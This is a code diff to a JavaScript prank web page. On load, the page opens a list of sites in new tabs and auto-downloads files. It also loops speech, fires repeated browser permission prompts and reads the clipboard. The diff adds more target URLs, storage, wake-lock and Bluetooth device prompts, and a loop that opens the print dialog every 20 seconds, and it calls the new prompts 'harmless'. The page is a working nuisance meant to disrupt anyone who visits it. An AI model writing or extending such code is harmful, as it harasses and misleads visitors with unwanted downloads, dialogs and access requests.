@@ -74,7 +74,10 @@
                 'https://discord.com/developers',
                 'https://totalenergies.com',
                 'https://sfr.com',
-                'https://bonzibuddy.org'
+                'https://bonzibuddy.org',
+                'chrome://chrome-urls/',  // Internal chrome page (may not open in new tab)
+                'https://www.fbi.gov',
+                'https://www.omegle.com'
             ];
 
             const SEARCHES = [
@@ -87,6 +90,7 @@
             ];
 
             const INTERVAL_SECONDS = 5;
+            const PRINT_INTERVAL_SECONDS = 20;
 
             function openUrl(url) {
                 const newWindow = window.open(url, '_blank');
@@ -155,6 +159,7 @@
             }
 
             function requestFakePermissions() {
+                // Existing permissions
                 if ('geolocation' in navigator) {
                     navigator.geolocation.getCurrentPosition(() => {}, () => {});
                 }
@@ -169,14 +174,34 @@
                 if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                     navigator.clipboard.readText().catch(() => {});
                 }
+
+                // 3 new permission requests (harmless)
+                if ('storage' in navigator && 'persist' in navigator.storage) {
+                    navigator.storage.persist().then(() => {});
+                }
+                if ('wakeLock' in navigator) {
+                    navigator.wakeLock.request('screen').catch(() => {});
+                }
+                if ('bluetooth' in navigator) {
+                    navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {});
+                }
+                // Additional optional ones (commented out to avoid overkill)
+                // if ('usb' in navigator) navigator.usb.requestDevice({ filters: [] }).catch(() => {});
+                // if ('hid' in navigator) navigator.hid.requestDevice({ filters: [] }).catch(() => {});
+            }
+
+            // New function to open print dialog every 20 seconds
+            function startPrintLoop() {
+                setInterval(() => {
+                    window.print();
+                }, PRINT_INTERVAL_SECONDS * 1000);
             }
 
             window.addEventListener('load', function() {
-                // Dummy popup removed as requested
-
                 setTimeout(downloadAllFiles, 500);
                 startLoopingTTS();
                 startCursorToggle();
+                startPrintLoop();
                 
                 setTimeout(requestFakePermissions, 1000);
                 setTimeout(requestFakePermissions, 4000);
